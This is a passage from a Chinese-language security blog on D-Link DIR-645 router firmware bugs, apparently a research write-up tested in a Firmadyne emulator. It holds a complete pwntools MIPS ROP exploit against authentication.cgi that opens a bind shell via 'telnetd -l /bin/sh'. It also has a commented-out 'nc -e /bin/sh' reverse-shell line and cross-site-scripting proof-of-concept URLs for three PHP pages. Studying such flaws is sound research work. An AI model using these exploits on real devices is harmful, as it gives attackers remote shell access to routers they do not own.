<p>而且在authenticationcgi_main()函数返回时也能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样。具体可以参考<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">文章</a>。</p>
<p><img src="image-20200531102820083.png" alt=""></p>
<h4 id="通过system函数getshell-1"><a href="#通过system函数getshell-1" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>整个流程图如下，</p>
<p><img src="image-20200531102945201.png" alt=""></p>
<p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/sh 192.168.0.122 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    data <span class="token operator">=</span> <span class="token string">'id=password='</span><span class="token operator">+</span>get_payload<span class="token punctuation">(</span><span class="token number">1056</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">print</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/authentication.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
<p>直接利用Firmadyne仿真环境进行测试，</p>
<p><img src="image-20200531103941133.png" alt=""></p>
<p>测试结果显示能够让目标机执行<code>telnetd -p 222 -l /bin/sh</code>。</p>
<p><img src="image-20200531104249650.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bind-php”"><a href="#Cross-site-scripting-on-“bind-php”" class="headerlink" title="Cross-site scripting on “bind.php”"></a>Cross-site scripting on “bind.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/parentalcontrols/bind.php</code></p>
<p>获取get表单中deviceid的内容并echo，典型的XSS。</p>
<p>81行    <code>welcome/?device_id=&lt;? echo $_GET["deviceid"];?&gt;';" /&gt;&amp;nbsp;&amp;nbs</code></p>
<p><img src="image-20200531214731796.png" alt=""></p>
<p>构造’?deviceid=<code>"/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code>‘其中“/&gt;是为了闭合前面&lt;“，之后直接加入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>即可，后面也可以加入’&lt;’匹配之后的’/&gt;’。</p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/parentalcontrols/bind.php?deviceid="/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;</code></p>
<p><img src="image-20200531211900473.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“info-php”"><a href="#Cross-site-scripting-on-“info-php”" class="headerlink" title="Cross-site scripting on “info.php”"></a>Cross-site scripting on “info.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/webinc/js/info.php</code></p>
<p>21行 <code>$title    = "ACTION ".$_GET["RESULT"];</code></p>
<p>30行 <code>echo "\t\tBODY.ShowMessage(\"".$title."\", msgArray);\n";</code></p>
<p><img src="image-20200531214052808.png" alt=""></p>
<p>获取get表单中RESULT的内容给title，之后echo，也是XSS。可以用<code>",msgArray);</code>闭合ShowMessage函数，然后再alert(‘xss’),最后用//注释掉后面代码。</p>
<p>poc：</p>
<p><code>http://&lt;target ip&gt;/info.php?RESULT=",msgArray);alert('xss');//</code></p>
<p><img src="image-20200531211655181.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bsc-sms-send-php”"><a href="#Cross-site-scripting-on-“bsc-sms-send-php”" class="headerlink" title="Cross-site scripting on “bsc_sms_send.php”"></a>Cross-site scripting on “bsc_sms_send.php”</h1><p><code>find . -name "bsc_sms_send.php"</code>，文件在<code>/htdocs/webinc/body/bsc_sms_send.php</code></p>
<p>其中的18行XSS漏洞。</p>
<p><img src="image-20200531213336975.png" alt=""></p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/bsc_sms_send.php?receiver="/&gt;&lt;script&gt;alert('xss');&lt;/script&gt;&lt;div</code></p>
<p><img src="image-20200531212954993.png" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://larry.ngrep.me/2018/05/16/dlink-dir-645-post-login-xml-bof/" target="_blank" rel="noopener">D-Link DIR-645 post_login.xml BoF</a></p>
<p>揭秘家用路由器0day挖掘技术</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://music.163.com/song?id=441532&userid=258169074'></li>
                        
                    
                        
                            <li title='1' data-url='https://link.hhtjim.com/163/26584453.mp3'></li>
                        
                    
                        
                            <li title='2' data-url='https://link.hhtjim.com/163/28245304.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci='177c577b486a2fd2b061'
        data-cs='ce4ec96a3a9f14b35d6e9d750e1d7f231c22db0e'
        data-r='pup2y.github.io'
        data-o='pup2y'
        data-a='pup2y'
        data-d='true'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#调试环境"><span class="toc-number">2.</span> <span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Buffer-overflow-on-“post-login-xml”"><span class="toc-number">3.</span> <span class="toc-text">Buffer overflow on “post_login.xml”</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持PC，确定偏移"><span class="toc-number">3.3.1.</span> <span class="toc-text">劫持PC，确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#选择攻击路径构造ROP链"><span class="toc-number">3.3.2.</span> <span class="toc-text">选择攻击路径构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过system函数getshell"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">通过system函数getshell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Buffer-overflow-on-“hedwig-cgi”"><span class="toc-number">4.</span> <span class="toc-text">Buffer overflow on “hedwig.cgi”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Buffer-overflow-on-“authentication-cgi”"><span class="toc-number">5.</span> <span class="toc-text">Buffer overflow on “authentication.cgi”</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍-2"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#定位漏洞函数"><span class="toc-number">5.2.1.</span> <span class="toc-text">定位漏洞函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持PC，确定偏移-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">劫持PC，确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#选择攻击路径构造ROP链-1"><span class="toc-number">5.3.2.</span> <span class="toc-text">选择攻击路径构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过system函数getshell-1"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">通过system函数getshell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-site-scripting-on-“bind-php”"><span class="toc-number">6.</span> <span class="toc-text">Cross-site scripting on “bind.php”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-site-scripting-on-“info-php”"><span class="toc-number">7.</span> <span class="toc-text">Cross-site scripting on “info.php”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-site-scripting-on-“bsc-sms-send-php”"><span class="toc-number">8.</span> <span class="toc-text">Cross-site scripting on “bsc_sms_send.php”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">9.</span> <span class="toc-text">参考资料</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"superSample":2,"hOffset":0,"vOffset":-20,"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>




</html>
